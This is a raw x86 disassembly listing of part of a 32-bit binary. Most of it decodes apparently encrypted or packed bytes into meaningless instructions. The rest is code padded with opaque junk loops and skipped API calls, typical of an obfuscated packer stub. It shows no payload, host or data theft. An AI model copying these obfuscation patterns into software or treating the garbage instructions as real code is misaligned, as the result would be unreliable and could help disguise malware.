  414437:	jb     0x4143fd
  414439:	call   0x8d8a01d2
  41443e:	retf   0x6c02
  414441:	lods   eax,DWORD PTR ds:[esi]
  414442:	mov    eax,es
  414444:	lods   al,BYTE PTR ds:[esi]
  414445:	ja     0x414416
  414447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414448:	iret   
  414449:	aas    
  41444a:	sbb    DWORD PTR ds:0x9b94d89e,edx
  414450:	dec    edi
  414451:	test   eax,0xb0c39117
  414456:	call   0x770d:0x7c117d32
  41445d:	jnp    0x414433
  41445f:	or     esp,DWORD PTR [esi-0x49]
  414462:	xchg   esp,eax
  414463:	retf   0x18d4
  414466:	and    ebx,DWORD PTR [ebx]
  414468:	sub    esi,edi
  41446a:	add    eax,0x8db9127e
  41446f:	pop    ebp
  414470:	into   
  414471:	pop    esp
  414472:	pop    ss
  414473:	cmp    eax,0xd8376c9f
  414478:	dec    edx
  41447a:	inc    ebp
  41447b:	in     al,dx
  41447c:	rol    DWORD PTR [esi-0x6e57aa6f],1
  414482:	out    0x2,al
  414484:	ins    BYTE PTR es:[edi],dx
  414485:	jae    0x414466
  414487:	sar    ch,0x2b
  41448a:	jb     0x41444b
  41448c:	cld    
  41448d:	jne    0x4144d7
  41448f:	mov    edx,edi
  414491:	xchg   BYTE PTR [edx-0x2c],cl
  414494:	arpl   WORD PTR [edx+eax*2],sp
  414497:	adc    BYTE PTR [ebx-0x195ae180],al
  41449d:	out    0xb2,al
  41449f:	xchg   edx,eax
  4144a0:	or     DWORD PTR [ebx],ebx
  4144a2:	out    0x58,eax
  4144a4:	pop    esi
  4144a5:	cmp    DWORD PTR [esi+eiz*4+0x6066fae2],esi
  4144ac:	xor    eax,0x7b344920
  4144b1:	dec    eax
  4144b2:	sub    DWORD PTR [eax],ebp
  4144b4:	mov    al,ds:0x9584abb6
  4144b9:	pusha  
  4144ba:	dec    edx
  4144bb:	not    DWORD PTR ds:0x1186b146
  4144c1:	sub    al,0x39
  4144c3:	push   ebp
  4144c4:	repz mov eax,0xb2bc17a2
  4144ca:	sub    ch,BYTE PTR [esi-0xa55ccf5]
  4144d0:	jg     0x4144be
  4144d2:	pop    ebx
  4144d3:	lock pop eax
  4144d5:	pop    eax
  4144d6:	cld    
  4144d7:	add    ecx,eax
  4144d9:	jne    0x414524
  4144db:	inc    esp
  4144dc:	retf   0x12d8
  4144df:	outs   dx,BYTE PTR ds:[esi]
  4144e0:	(bad)  
  4144e1:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4144e3:	sbb    al,0x1
  4144e5:	aad    0xc3
  4144e7:	and    esp,ebx
  4144e9:	lea    ebp,[eax]
  4144eb:	sbb    al,0xe9
  4144ed:	cmp    DWORD PTR [ebp-0x18],esi
  4144f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144f1:	call   0x6f1a:0x595eca8d
  4144f8:	test   eax,0x7c8e7467
  4144fd:	xchg   edx,eax
  4144fe:	lahf   
  4144ff:	mov    cl,cl
  414501:	mov    ebx,0xc1b50499
  414506:	xchg   esp,eax
  414507:	test   DWORD PTR [eax-0x5b1450f9],edi
  41450d:	shr    BYTE PTR [ebx],0x57
  414510:	jns    0x414502
  414512:	nop
  414513:	or     eax,0x85d4c2a5
  414518:	stc    
  414519:	sbb    al,0x82
  41451b:	mov    edi,0x4fd3e3d2
  414520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414521:	pusha  
  414522:	push   esi
  414523:	and    edi,DWORD PTR [esi+0x31]
  414526:	sbb    eax,0xc1e134be
  41452b:	push   es
  41452c:	fnsave [ecx+0x4c24a1]
  414532:	or     eax,0x6b895bca
  414537:	sbb    BYTE PTR [esi-0x9f4c37a],0x90
  41453e:	push   0xffffff95
  414540:	test   BYTE PTR [ecx+edx*4-0x3],ch
  414544:	rcr    BYTE PTR [edx],cl
  414546:	xor    eax,0x15e4cf18
  41454c:	mov    cl,0x16
  41454e:	xor    BYTE PTR [esi],0x2b
  414551:	daa    
  414552:	lock mov esp,0x225f0ce1
  414558:	aas    
  414559:	lods   al,BYTE PTR ds:[esi]
  41455a:	rcl    DWORD PTR [esi+0xa5d9a37],0xe3
  414561:	or     al,dh
  414563:	hlt    
  414564:	xchg   ebx,eax
  414565:	pop    edi
  414566:	jae    0x4145ae
  414568:	mov    dl,0x6
  41456a:	in     al,0x50
  41456c:	out    0xea,al
  41456e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41456f:	cld    
  414570:	xchg   ebp,esp
  414572:	mov    WORD PTR [edx],?
  414574:	and    esp,DWORD PTR [ecx+0x6d69f5c]
  41457a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457b:	mov    esi,0x72f502a9
  414580:	das    
  414581:	dec    esp
  414582:	jnp    0x414538
  414584:	xor    BYTE PTR [ebp-0x2d],0xed
  414588:	sub    DWORD PTR [edx+0x2603316b],0xd7d17d1f
  414592:	pop    ecx
  414593:	dec    ebx
  414594:	popf   
  414595:	dec    eax
  414596:	jl     0x4145ad
  414598:	je     0x4145fd
  41459a:	xchg   edi,eax
  41459b:	pop    es
  41459c:	pop    esp
  41459d:	jg     0x4145de
  41459f:	xor    eax,0x6eb26023
  4145a4:	mov    dl,0x7f
  4145a6:	jo     0x4145e0
  4145a8:	repz mov ebp,0x834b85ba
  4145ae:	sub    eax,0xe797f872
  4145b3:	push   esp
  4145b4:	icebp  
  4145b5:	xor    esi,ebp
  4145b7:	mov    eax,0x268f0f1e
  4145bc:	lea    eax,[eax+0xa542ff5]
  4145c2:	loop   0x414594
  4145c4:	jmp    0xc64d:0xd7e2bee1
  4145cb:	push   es
  4145cc:	fnstenv [eax]
  4145ce:	cwde   
  4145cf:	mov    dl,0x5d
  4145d1:	loope  0x414574
  4145d3:	arpl   WORD PTR [eax],bx
  4145d5:	jae    0x414567
  4145d7:	add    ebx,esi
  4145d9:	stc    
  4145da:	cs imul edi,eax,0x79a48f27
  4145e1:	ffreep st(0)
  4145e3:	ins    BYTE PTR es:[edi],dx
  4145e4:	test   dh,bh
  4145e6:	repnz and al,0xa7
  4145e9:	rol    BYTE PTR [edi+0x22],cl
  4145ec:	mov    edx,0xa96d2bfc
  4145f1:	scas   al,BYTE PTR es:[edi]
  4145f2:	fistp  QWORD PTR [ebx-0x47]
  4145f5:	adc    eax,0x64192d14
  4145fa:	popf   
  4145fb:	jo     0x41464a
  4145fd:	(bad)  
  4145fe:	mov    esi,0x757e7a06
  414603:	enter  0x552e,0xc
  414607:	push   ds
  414608:	cld    
  414609:	mov    ah,0xa2
  41460b:	mov    ds:0x2df69c15,al
  414610:	push   ebp
  414611:	push   esp
  414612:	or     dl,BYTE PTR [ebp+eiz*8+0x6b4b0f5d]
  414619:	call   0x8127:0x9e643312
  414620:	repz xor dh,cl
  414623:	dec    ecx
  414624:	adc    eax,0xac13eb87
  414629:	jb     0x414699
  41462b:	imul   edx,esp,0x7a6e2a49
  414631:	push   esi
  414632:	lds    ecx,FWORD PTR [edi-0x59]
  414635:	xchg   ecx,eax
  414636:	and    al,0x3
  414638:	sar    DWORD PTR [esi+0x6c6549da],1
  41463e:	ins    BYTE PTR es:[edi],dx
  41463f:	adc    ebp,DWORD PTR [ecx]
  414641:	dec    eax
  414642:	mov    ebp,0x50a37831
  414647:	fsubr  QWORD PTR [ebx-0x54]
  41464a:	fsubr  QWORD PTR [ecx-0x1d11a87a]
  414650:	test   eax,0x38797626
  414655:	sbb    al,0xf7
  414657:	or     eax,0xa83ec70e
  41465c:	mov    dh,0x2
  41465e:	call   0xfb77:0x807db042
  414665:	mov    bh,0xf8
  414667:	sbb    eax,0xff3282d3
  41466c:	push   ss
  41466d:	js     0x41469e
  41466f:	sub    cl,bl
  414671:	enter  0x5e36,0x59
  414675:	mov    al,BYTE PTR [ebp-0x6d]
  414678:	mov    esp,0xdab3ed3b
  41467d:	adc    al,0xe9
  41467f:	xor    eax,0x1305042c
  414684:	inc    DWORD PTR [eax+0x7e01f061]
  41468a:	adc    edi,DWORD PTR [edi]
  41468c:	mov    eax,0xe2ebecfc
  414691:	aad    0x2a
  414693:	outs   dx,BYTE PTR ds:[esi]
  414694:	mov    al,ds:0x4f1685a4
  414699:	addr16 cs xchg edi,eax
  41469c:	sbb    bh,BYTE PTR [eax]
  41469e:	ja     0x414660
  4146a0:	pop    edi
  4146a1:	mov    ebx,0x1bad3a57
  4146a6:	pop    bx
  4146a8:	xor    al,BYTE PTR [ecx+0x3ab672fa]
  4146ae:	xchg   ah,dl
  4146b0:	sti    
  4146b1:	and    eax,0x1711d07d
  4146b6:	add    dl,BYTE PTR [ecx-0x51028143]
  4146bc:	jno    0x41468e
  4146be:	jmp    0x414646
  4146c0:	push   esi
  4146c1:	push   eax
  4146c2:	pop    edi
  4146c3:	mov    esp,0x20b833af
  4146c8:	inc    ebp
  4146c9:	imul   eax,ecx,0x57
  4146cc:	in     eax,0x15
  4146ce:	jnp    0x41468d
  4146d0:	rcl    BYTE PTR [esi],cl
  4146d2:	les    ecx,FWORD PTR [ecx-0x71636121]
  4146d8:	dec    esp
  4146d9:	fisubr DWORD PTR [eax+edx*1]
  4146dc:	fisubr DWORD PTR gs:[ebx-0x27829aa9]
  4146e3:	cwde   
  4146e4:	push   es
  4146e5:	std    
  4146e6:	push   ecx
  4146e7:	push   0x8d342dc0
  4146ec:	jae    0x4146cb
  4146ee:	fnstenv [edi-0x2a79df26]
  4146f4:	push   ss
  4146f5:	pop    esp
  4146f6:	push   ecx
  4146f7:	dec    esp
  4146f8:	inc    edi
  4146f9:	jecxz  0x4146b4
  4146fb:	push   esp
  4146fc:	lock div DWORD PTR [edx+edx*1-0x5e7cb30f]
  414704:	mov    ebx,0xdbb2f0c9
  414709:	popf   
  41470a:	pop    ebx
  41470b:	jge    0x41469a
  41470d:	mov    al,0xfe
  41470f:	mov    al,ds:0x7ea079a1
  414714:	lock xchg ebp,eax
  414716:	mov    ecx,0xcf29c18c
  41471b:	inc    eax
  41471c:	adc    bh,cl
  41471e:	stos   DWORD PTR es:[edi],eax
  41471f:	push   ds
  414720:	jp     0x414725
  414722:	call   0x8fdc:0x69623f85
  414729:	int    0x74
  41472b:	mov    esp,0x65560d59
  414730:	retf   
  414731:	pushfw 
  414733:	pushf  
  414734:	add    DWORD PTR [edx],esi
  414736:	imul   esp,DWORD PTR [ebx+esi*1-0x429a11d3],0xb49878b8
  414741:	inc    BYTE PTR [ecx+0x70]
  414744:	jne    0x414755
  414746:	test   al,0x5a
  414748:	sahf   
  414749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41474a:	push   DWORD PTR [edi]
  41474c:	jae    0x4146f9
  41474e:	fisttp QWORD PTR [edi+eax*2+0x328709a5]
  414755:	dec    eax
  414756:	or     al,ch
  414758:	xor    DWORD PTR [ebx+0x5b],edi
  41475b:	jnp    0x4147a4
  41475d:	rol    ah,0xc4
  414760:	inc    esp
  414761:	daa    
  414762:	pushf  
  414763:	gs daa 
  414765:	in     al,dx
  414766:	mov    eax,0x4ed56471
  41476b:	enter  0xf176,0x5b
  41476f:	mov    ebp,0x9000efa7
  414774:	mov    edi,0xd5256e59
  414779:	outs   dx,BYTE PTR ds:[esi]
  41477a:	dec    ecx
  41477b:	rcr    BYTE PTR [edx],cl
  41477d:	shl    ebx,1
  41477f:	arpl   WORD PTR [eax-0x6f14ffa0],cx
  414785:	inc    edi
  414786:	leave  
  414787:	aad    0xcd
  414789:	ror    DWORD PTR [bp+0x20],0xd1
  41478e:	mov    edi,0x663b7a8f
  414793:	and    BYTE PTR [ecx-0x7d],cl
  414796:	mul    BYTE PTR [edi+0x20]
  414799:	jmp    0xcbbfcf96
  41479e:	lds    ebp,FWORD PTR ds:0xb20553c9
  4147a4:	add    BYTE PTR [ebx*1+0x9beb774],0x8b
  4147ac:	call   0xd17a:0x708c81f3
  4147b3:	push   edi
  4147b4:	dec    ecx
  4147b5:	mov    bh,0x60
  4147b7:	inc    ebx
  4147b8:	mov    edx,DWORD PTR [esi-0x4a423c9]
  4147be:	outs   dx,DWORD PTR ds:[esi]
  4147bf:	gs out dx,eax
  4147c1:	test   al,0x99
  4147c3:	pop    ss
  4147c4:	fisttp DWORD PTR ds:0x1e458388
  4147ca:	cld    
  4147cb:	out    0x98,al
  4147cd:	pop    ds
  4147ce:	xor    ah,BYTE PTR [ecx+0x2]
  4147d1:	adc    DWORD PTR [esi],esi
  4147d3:	inc    edx
  4147d4:	pop    edx
  4147d5:	outs   dx,DWORD PTR ds:[esi]
  4147d6:	ds jb  0x41477f
  4147d9:	jbe    0x4147d8
  4147db:	mov    fs,ebx
  4147dd:	pop    ecx
  4147de:	xchg   ebp,eax
  4147df:	add    BYTE PTR [ecx],bh
  4147e1:	pop    ss
  4147e2:	out    dx,eax
  4147e3:	gs jb  0x414837
  4147e6:	mov    DWORD PTR [edx],ebp
  4147e8:	xor    al,0xc5
  4147ea:	ins    DWORD PTR es:[edi],dx
  4147eb:	push   cs
  4147ec:	and    bh,ch
  4147ee:	int3   
  4147ef:	ret    
  4147f0:	pusha  
  4147f1:	add    BYTE PTR [ebx+0x7e],dl
  4147f4:	add    eax,0x877f2085
  4147f9:	dec    ebp
  4147fa:	mov    DWORD PTR [ebx],0x4669eaa6
  414800:	or     DWORD PTR es:[ebx-0x6e],0x26
  414805:	pop    ds
  414806:	sub    ah,dh
  414808:	push   0x9d0bd087
  41480d:	lahf   
  41480e:	dec    ecx
  41480f:	mov    ds:0xdcdd42fd,eax
  414814:	xchg   edx,eax
  414815:	outs   dx,DWORD PTR ds:[esi]
  414816:	inc    eax
  414817:	ret    
  414818:	mov    edi,0x1022b8be
  41481d:	cmp    ecx,DWORD PTR [eax+0x54]
  414820:	es pushf 
  414822:	jl     0x41487b
  414824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414825:	mov    cl,0x44
  414827:	xor    DWORD PTR [edx],esp
  414829:	sub    eax,0x53b0cdcb
  41482e:	mov    gs,WORD PTR [ebx]
  414830:	push   edx
  414831:	sti    
  414832:	pop    edi
  414833:	js     0x4147e5
  414835:	dec    edx
  414836:	out    dx,al
  414837:	add    DWORD PTR [ebx-0x6c17de9c],esp
  41483d:	pop    eax
  41483e:	sbb    bh,BYTE PTR [ebp+0x6a]
  414841:	jno    0x4148a9
  414843:	mov    ebx,0xb46222fd
  414848:	add    bh,BYTE PTR [ecx+0x4cf90aaa]
  41484e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41484f:	(bad)  
  414850:	mov    bl,0x86
  414852:	xchg   ebx,eax
  414853:	imul   esi,DWORD PTR [edx],0xffffffa6
  414856:	repz jne 0x41483c
  414859:	cli    
  41485a:	xlat   BYTE PTR ds:[ebx]
  41485b:	sbb    dh,BYTE PTR [edx-0x4085f8a6]
  414861:	jnp    0x414806
  414863:	dec    esi
  414864:	scas   al,BYTE PTR es:[edi]
  414865:	je     0x414876
  414867:	imul   esi,esi,0x67
  41486a:	mov    DWORD PTR [esi-0x27d4b18e],esi
  414870:	stos   DWORD PTR es:[edi],eax
  414871:	and    BYTE PTR [edi+0x45153e14],bh
  414877:	fild   QWORD PTR [ecx]
  414879:	mov    WORD PTR [edx-0xa],gs
  41487c:	push   ebp
  41487d:	out    0x47,eax
  41487f:	jge    0x41481f
  414881:	add    esi,ebx
  414883:	lods   al,BYTE PTR ds:[esi]
  414884:	add    al,0x51
  414886:	jae    0x4148ec
  414888:	scas   al,BYTE PTR es:[edi]
  414889:	adc    esi,DWORD PTR [edi+eax*4-0x6168f53c]
  414890:	popf   
  414891:	push   ds
  414892:	pusha  
  414893:	test   eax,0xbc177c6c
  414898:	sbb    DWORD PTR [edx],eax
  41489a:	xor    ecx,edx
  41489c:	test   BYTE PTR [eax-0x4],0xcb
  4148a0:	add    esp,edi
  4148a2:	ror    dl,0xd2
  4148a5:	jge    0x41488c
  4148a7:	mul    DWORD PTR [ebx+edx*2+0x491c09f1]
  4148ae:	retf   
  4148af:	cwde   
  4148b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b1:	lea    edx,[ecx]
  4148b3:	jns    0x41485f
  4148b5:	jp     0x414888
  4148b7:	mov    ah,0x2
  4148b9:	jns    0x4148f4
  4148bb:	int3   
  4148bc:	adc    cl,BYTE PTR ds:0x535d7ef1
  4148c2:	or     al,0xb1
  4148c4:	mov    dl,0xa5
  4148c6:	pushf  
  4148c7:	jo     0x4148a0
  4148c9:	scas   al,BYTE PTR es:[edi]
  4148ca:	mov    bh,0xe7
  4148cc:	push   eax
  4148cd:	xchg   ebx,esi
  4148cf:	cmp    BYTE PTR [ecx],ah
  4148d1:	ss fwait
  4148d3:	sbb    eax,0xb5b233b6
  4148d8:	cmp    BYTE PTR [ebp+0xe],dl
  4148db:	inc    edx
  4148dc:	pop    edi
  4148dd:	sar    DWORD PTR [edi-0x3d],0xac
  4148e1:	stos   BYTE PTR es:[edi],al
  4148e2:	loope  0x414941
  4148e4:	out    0xd4,al
  4148e6:	call   0xabf0:0x36cf40ba
  4148ed:	mov    BYTE PTR [edi-0x1],ah
  4148f0:	pop    esp
  4148f1:	mov    al,ds:0x70a6422
  4148f6:	mov    WORD PTR [edi],fs
  4148f8:	mov    ah,BYTE PTR [edi+0xf]
  4148fb:	jb     0x41492f
  4148fd:	sub    al,0xba
  4148ff:	sub    BYTE PTR [ebx-0x38c599f9],cl
  414905:	jmp    0x41490a
  414907:	and    al,0xc1
  414909:	jae    0x41497a
  41490b:	test   eax,0xc45ff2b7
  414910:	adc    edx,DWORD PTR [eax+0x7e]
  414913:	cmp    ah,BYTE PTR [ebx+0x44]
  414916:	mov    bl,al
  414918:	icebp  
  414919:	and    edi,esi
  41491b:	fstp   DWORD PTR [edi-0xd]
  41491e:	ds inc edx
  414920:	cli    
  414921:	lds    ebx,FWORD PTR [ebx]
  414923:	mov    bh,0x33
  414925:	jmp    DWORD PTR [ecx]
  414927:	(bad)  
  414928:	dec    edi
  414929:	inc    esi
  41492a:	sbb    DWORD PTR [edx+0x79188648],edx
  414930:	jno    0x414963
  414932:	popa   
  414933:	push   ds
  414934:	scas   eax,DWORD PTR es:[edi]
  414935:	adc    eax,esi
  414937:	(bad)
  41493a:	std    
  41493b:	(bad)  [edi+edx*8-0x38fd34a6]
  414942:	in     eax,0x93
  414944:	mov    cl,0xae
  414946:	ins    BYTE PTR es:[edi],dx
  414947:	push   es
  414948:	mov    ebx,DWORD PTR [esi+ebp*1-0x18]
  41494c:	repnz inc edi
  41494e:	rcl    ecx,0x7c
  414951:	fiadd  DWORD PTR [ebp+0x54b444e4]
  414957:	outs   dx,DWORD PTR ds:[esi]
  414958:	jae    0x414954
  41495a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41495b:	mov    dh,0xf0
  41495d:	add    al,0xa9
  41495f:	mov    dl,0xec
  414961:	mov    al,ds:0x2d0aab53
  414966:	mov    BYTE PTR [eax],bh
  414968:	jl     0x414918
  41496a:	xchg   ebx,eax
  41496b:	and    ecx,DWORD PTR [esi+0x45]
  41496e:	aad    0xf2
  414970:	mov    bl,0xae
  414972:	retf   0xe3fd
  414975:	cmp    eax,0x43e34586
  41497a:	mov    cs,WORD PTR [eax*4+0x7577aa1f]
  414981:	mov    dh,0x88
  414983:	(bad)  
  414984:	pop    esi
  414985:	mov    al,0x1d
  414987:	out    0xf1,al
  414989:	sbb    BYTE PTR [edi+0x69eb824b],0x9c
  414990:	mov    bl,0xa6
  414992:	data16 daa 
  414994:	ror    ecx,0xfc
  414997:	retf   0x5a14
  41499a:	retf   0xbf4e
  41499d:	pop    esp
  41499e:	test   al,0x17
  4149a0:	(bad)  
  4149a1:	and    al,0x3d
  4149a3:	mov    dh,0x3e
  4149a5:	cwde   
  4149a6:	adc    DWORD PTR [ebp+0x595b6e78],ecx
  4149ac:	(bad)  
  4149ae:	sub    eax,0xfcadf002
  4149b3:	jg     0x4149cd
  4149b5:	aas    
  4149b6:	repnz repz mov esi,DWORD PTR [edi]
  4149ba:	or     BYTE PTR [ecx-0x7],ch
  4149bd:	neg    esp
  4149bf:	cmp    al,0x13
  4149c1:	in     al,0xba
  4149c3:	or     DWORD PTR [esi+ebp*4+0x10],edx
  4149c7:	ficom  WORD PTR [edi]
  4149c9:	inc    ebx
  4149ca:	push   esp
  4149cb:	xlat   BYTE PTR ds:[ebx]
  4149cc:	inc    ecx
  4149cd:	inc    eax
  4149ce:	push   edi
  4149cf:	ret    
  4149d0:	add    BYTE PTR [ecx],ch
  4149d2:	not    BYTE PTR [ecx+esi*8+0xc]
  4149d6:	mov    bh,0x55
  4149d8:	es pusha 
  4149da:	mov    dh,0xa1
  4149dc:	stos   BYTE PTR es:[edi],al
  4149dd:	jmp    0x7151e828
  4149e2:	imul   edx,DWORD PTR [ebp-0x4f],0xcb44c75a
  4149e9:	add    BYTE PTR [ecx-0x12],cl
  4149ec:	popf   
  4149ed:	jb     0x4149e1
  4149ef:	or     BYTE PTR [edi-0x22],al
  4149f2:	xor    al,0xcc
  4149f4:	jmp    0x414a63
  4149f6:	add    al,0x57
  4149f8:	clc    
  4149f9:	(bad)  
  4149fa:	pop    ds
  4149fb:	jnp    0x414a43
  4149fd:	ret    0xe9da
  414a00:	imul   DWORD PTR [ecx+0x1fcf516b]
  414a06:	push   ebx
  414a07:	nop
  414a08:	sub    esp,DWORD PTR [edi+0x63ce4bf5]
  414a0e:	es sbb eax,0xd11f4d90
  414a14:	fstp   QWORD PTR [ebp*1+0x12e08565]
  414a1b:	shr    DWORD PTR [edx+eiz*2-0x1f],cl
  414a1f:	push   esi
  414a20:	outs   dx,DWORD PTR ds:[esi]
  414a21:	push   es
  414a22:	mov    BYTE PTR [eax+0x1594b4fe],bl
  414a28:	sub    esi,ebp
  414a2a:	adc    BYTE PTR [esi+0x29],dl
  414a2d:	fld    TBYTE PTR [esi+edi*4-0x5e4eaf04]
  414a34:	int    0x10
  414a36:	pusha  
  414a37:	test   BYTE PTR [eiz*8-0x5fa648a2],dh
  414a3e:	clc    
  414a3f:	jp     0x414a6a
  414a41:	mov    bl,0x6c
  414a43:	jo     0x414a40
  414a45:	push   esp
  414a46:	loop   0x4149cd
  414a48:	sbb    edx,DWORD PTR [esi+0x37a1d052]
  414a4e:	xor    eax,0xbef6e092
  414a53:	vmread DWORD PTR [ecx+eax*8+0x6cde868e],edi
  414a5b:	mov    ecx,0x509d942d
  414a60:	gs adc al,0x22
  414a63:	(bad)  
  414a64:	mov    ecx,0x824cb0f7
  414a69:	xchg   BYTE PTR [eax-0x23],dl
  414a6c:	jo     0x414a96
  414a6e:	out    0x78,eax
  414a70:	sbb    bl,dh
  414a72:	jp     0x414a0b
  414a74:	sahf   
  414a75:	inc    ebp
  414a76:	jge    0x414af2
  414a78:	lods   al,BYTE PTR ds:[esi]
  414a79:	pop    ebp
  414a7a:	inc    ebp
  414a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a7c:	mov    bh,BYTE PTR [ecx+0x2de387aa]
  414a82:	xchg   bp,ax
  414a84:	pop    eax
  414a85:	inc    esp
  414a86:	mov    DWORD PTR [ebp-0x4c],ecx
  414a89:	mov    ecx,DWORD PTR [ebp+0x8]
  414a8c:	mov    edx,0xfdbe0321
  414a91:	sub    edx,ecx
  414a93:	add    edx,DWORD PTR [ebp-0x48]
  414a96:	mov    DWORD PTR [ebp-0x48],edx
  414a99:	mov    ecx,DWORD PTR [ebp+0x8]
  414a9c:	mov    edx,DWORD PTR [ebp-0x44]
  414a9f:	add    ecx,edi
  414aa1:	xor    ecx,edx
  414aa3:	mov    DWORD PTR [ebp-0x44],ecx
  414aa6:	mov    ecx,DWORD PTR [ebp+0x8]
  414aa9:	xor    ecx,eax
  414aab:	add    ecx,esi
  414aad:	jne    0x4126b9
  414ab3:	mov    ecx,DWORD PTR [ebp-0x8]
  414ab6:	xor    ecx,eax
  414ab8:	mov    eax,DWORD PTR [ebp+0x10]
  414abb:	add    ecx,esi
  414abd:	mov    DWORD PTR [eax],ecx
  414abf:	pop    edi
  414ac0:	pop    esi
  414ac1:	pop    ebx
  414ac2:	leave  
  414ac3:	ret    0xc
  414ac6:	push   ebp
  414ac7:	mov    ebp,esp
  414ac9:	sub    esp,0x78
  414acc:	mov    eax,ds:0x42a079
  414ad1:	xor    ecx,ecx
  414ad3:	xor    ecx,DWORD PTR ds:0x42a07d
  414ad9:	sub    eax,ecx
  414adb:	add    eax,DWORD PTR [eax+ecx*1]
  414ade:	push   esi
  414adf:	adc    DWORD PTR ds:0x428e29,ecx
  414ae5:	push   edi
  414ae6:	and    edi,0x4523
  414aec:	mov    eax,ds:0x428365
  414af1:	mov    DWORD PTR [ebp-0x24],eax
  414af4:	add    esi,DWORD PTR ds:0x428ed1
  414afa:	mov    eax,ds:0x428485
  414aff:	add    DWORD PTR ds:0x428e45,0x631e
  414b09:	mov    DWORD PTR [ebp-0x30],eax
  414b0c:	sub    esi,esi
  414b0e:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  414b15:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  414b1c:	xor    eax,ecx
  414b1e:	mov    eax,DWORD PTR [ebp-0x10]
  414b21:	or     DWORD PTR ds:0x428e35,0x297e
  414b2b:	mov    ecx,DWORD PTR [ebp-0x10]
  414b2e:	sub    eax,ecx
  414b30:	mov    DWORD PTR ds:0x428ea1,0x15
  414b3a:	cmp    DWORD PTR ds:0x428ea1,0x0
  414b41:	je     0x414b99
  414b47:	cmp    DWORD PTR ds:0x428ea1,0x5
  414b4e:	jb     0x414b99
  414b54:	jmp    0x414b6b
  414b59:	push   0x4280ea
  414b5e:	push   0x1
  414b60:	push   0x6e8b
  414b65:	call   DWORD PTR ds:0x42ca60
  414b6b:	cmp    DWORD PTR ds:0x428ea1,0x6
  414b72:	jne    0x414b87
  414b78:	xor    edi,edi
  414b7a:	or     edi,DWORD PTR ds:0x428ea1
  414b80:	dec    edi
  414b81:	mov    DWORD PTR ds:0x428ea1,edi
  414b87:	mov    edi,DWORD PTR ds:0x428ea1
  414b8d:	dec    edi
  414b8e:	mov    DWORD PTR ds:0x428ea1,edi
  414b94:	jmp    0x414b3a
  414b99:	mov    DWORD PTR [ebp-0x10],eax
  414b9c:	sub    DWORD PTR ds:0x428e75,0x4181
  414ba6:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  414bad:	mov    eax,DWORD PTR [ebp-0x18]
  414bb0:	neg    edi
  414bb2:	mov    ecx,DWORD PTR [ebp-0x18]
  414bb5:	sub    eax,ecx
  414bb7:	mov    DWORD PTR [ebp-0x18],eax
  414bba:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  414bc1:	add    DWORD PTR ds:0x428e31,0x596
  414bcb:	mov    eax,DWORD PTR [ebp-0xc]
  414bce:	adc    DWORD PTR ds:0x428e25,ebx
  414bd4:	mov    ecx,DWORD PTR [ebp-0xc]
  414bd7:	add    DWORD PTR ds:0x428e69,ecx
  414bdd:	sub    eax,ecx
  414bdf:	add    edi,0x58c9
  414be5:	mov    DWORD PTR [ebp-0xc],eax
  414be8:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  414bef:	adc    ecx,0x6a40
  414bf5:	mov    eax,DWORD PTR [ebp-0x1c]
  414bf8:	mov    ecx,DWORD PTR [ebp-0x1c]
  414bfb:	adc    DWORD PTR ds:0x428ea5,ecx
  414c01:	sub    eax,ecx
  414c03:	xor    DWORD PTR ds:0x428e8d,edi
  414c09:	mov    DWORD PTR [ebp-0x1c],eax
  414c0c:	or     DWORD PTR [ebp-0x1c],0xf89c8599
  414c13:	mov    eax,DWORD PTR [ebp-0x20]
  414c16:	neg    DWORD PTR ds:0x428ea9
  414c1c:	mov    ecx,DWORD PTR [ebp-0x20]
  414c1f:	sub    eax,ecx
  414c21:	xor    esi,esi
  414c23:	xor    esi,DWORD PTR ds:0x4292f5
  414c29:	xor    edi,edi
  414c2b:	xor    edi,DWORD PTR ds:0x429bf5
  414c31:	sub    esi,edi
  414c33:	or     esi,DWORD PTR [esi+edi*1]
  414c36:	mov    DWORD PTR [ebp-0x20],eax
  414c39:	or     eax,edi
  414c3b:	mov    eax,DWORD PTR [ebp-0x2c]
  414c3e:	and    DWORD PTR ds:0x428e25,0x0
  414c48:	jmp    0x414c5a
  414c4d:	mov    esi,DWORD PTR ds:0x428e25
  414c53:	inc    esi
  414c54:	mov    DWORD PTR ds:0x428e25,esi
  414c5a:	cmp    DWORD PTR ds:0x428e25,0x1e
  414c61:	jae    0x414c93
  414c67:	cmp    DWORD PTR ds:0x428e25,0x2c
  414c6e:	jb     0x414c93
  414c74:	jmp    0x414c8e
  414c79:	push   0x42819a
  414c7e:	push   0x0
  414c80:	push   DWORD PTR [ebp-0x14]
  414c83:	push   0x541c
  414c88:	call   DWORD PTR ds:0x42ca64
  414c8e:	jmp    0x414c4d
  414c93:	mov    ecx,DWORD PTR [ebp-0x20]
  414c96:	mov    esi,0x75108b1
  414c9b:	xor    eax,esi
  414c9d:	adc    DWORD PTR ds:0x428ec9,0x2d36
  414ca7:	mov    edi,0x3272f8
  414cac:	and    DWORD PTR ds:0x428e91,0x428e49
  414cb6:	add    eax,edi
  414cb8:	or     eax,ecx
  414cba:	or     DWORD PTR ds:0x428e2d,0x148
  414cc4:	mov    DWORD PTR [ebp-0x20],eax
  414cc7:	mov    DWORD PTR ds:0x428e99,0x13
  414cd1:	cmp    DWORD PTR ds:0x428e99,0x0
  414cd8:	je     0x414d27
  414cde:	cmp    DWORD PTR ds:0x428e99,0x8
  414ce5:	jle    0x414d27
  414ceb:	jmp    0x414cf9
  414cf0:	push   DWORD PTR [ebp-0x20]
